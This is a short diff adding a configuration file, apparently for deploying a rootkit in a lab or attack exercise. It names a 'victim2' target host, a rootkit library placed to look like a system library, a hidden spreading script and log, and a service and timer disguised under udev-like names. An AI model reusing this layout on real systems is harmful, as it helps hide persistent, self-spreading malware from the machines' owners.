@@ -1,0 +1,9 @@
+---
+username: cyrano
+target_host: victim2
+target_user: cyrano
+rootkit_lib: /lib/x86_64-linux-gnu/libsysmon.so.1
+spread_script: /usr/local/bin/.kit_spread.sh
+spread_log: "/home/cyrano/.kit_spread.log"
+spread_service: "udev-helper.service"
+spread_timer: "udev-helper.timer"
